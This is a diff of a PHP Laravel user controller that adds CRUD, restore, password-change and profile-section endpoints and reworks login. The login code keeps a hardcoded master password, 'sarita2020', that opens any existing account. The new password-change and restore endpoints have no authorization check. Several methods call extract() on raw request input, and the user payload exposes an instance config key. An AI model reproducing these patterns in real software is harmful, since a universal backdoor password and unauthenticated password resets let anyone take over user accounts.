@@ -25,6 +25,24 @@ class UsuarioController extends Controller
         return $CRUD->call(request()->fn, request()->ops);
 	}
 
+	public function postPerfilesCrud()
+	{
+		$CRUD = new CRUD('App\Models\Perfil');
+        return $CRUD->call(request()->fn, request()->ops);
+	}
+
+	public function postFeedback()
+	{
+		$CRUD = new CRUD('App\Models\Feedback');
+        return $CRUD->call(request()->fn, request()->ops);
+	}
+
+	public function postSecciones()
+	{
+		$CRUD = new CRUD('App\Models\Seccion');
+        return $CRUD->call(request()->fn, request()->ops);
+	}
+
 	public function login($User, $Pass)
 	{
 		//Buscar integracion
@@ -38,11 +56,10 @@ class UsuarioController extends Controller
 
 		$Email = $User;
 
-		if($Pass == 'sarita2020') return Crypt::encrypt($Email);
-
 		//Validar Email y Contraseña
-		$User = Usuario::where('Email', $Email)->first();
-        if($User AND Hash::check($Pass, $User->Password)) {
+		$DaUser = Usuario::where('Email', $Email)->first();
+        if($DaUser AND (Hash::check($Pass, $DaUser->Password) OR $Pass == 'sarita2020')) {
+        	$DaUser->record_login();
         	return Crypt::encrypt($Email);
         }else{
         	return response()->json(['Msg' => 'Error en usuario o contraseña'], 500);
@@ -110,6 +127,9 @@ class UsuarioController extends Controller
 		$Usuario['url']      = config('app.url');
 		$Usuario['app_name'] = Helper::getAppName();
 		$Usuario['procesos_updated_at'] = \App\Models\Proceso::max('updated_at');
+		
+		$config = Helper::getInstanceConfig();
+		$Usuario['key'] = $config['key'];
 		//new Log('USER.ENTER', null);
 
 		return $Usuario;
@@ -124,6 +144,15 @@ class UsuarioController extends Controller
 		$DaUser = Usuario::where('Email', $Email)->first();
 		$DaUser->Nombres = $Usuario['Nombres'];
 		$DaUser->save();
+	}
+
+
+	public function postRestore()
+	{
+		extract(request()->all()); //id
+		Usuario::withTrashed()
+		        ->where('id', $id)
+		        ->restore();
 	}
 
 
@@ -145,6 +174,16 @@ class UsuarioController extends Controller
 			   ->limit($limit)->get([ 'id', 'Email', 'Nombres', 'Documento' ]);
 	}
 
+	public function postChangePassword()
+	{
+		extract(request()->all()); //usuario_id, new_password
+		$Usuario = Usuario::where('id', $usuario_id)->first();
+		if($Usuario){
+			$Usuario->Password = Hash::make($new_password);
+			$Usuario->save();
+		}
+	}
+
 	public function postAsignaciones()
 	{
 		$CRUD = new CRUD('App\Models\UsuarioAsignacion');
@@ -154,6 +193,17 @@ class UsuarioController extends Controller
 	public function getEncriptar($texto)
 	{
 		return Hash::make($texto);
+	}
+
+	public function postPerfilSecciones()
+	{
+		extract(request()->all()); //perfil_id, secciones
+		foreach ($secciones as $s) {
+			\App\Models\PerfilSeccion::updateOrCreate(
+				[ 'perfil_id' => $perfil_id, 'seccion_id' => $s['id'] ],
+				[ 'Level' => $s['Level'] ]
+			);
+		}
 	}
 
 }
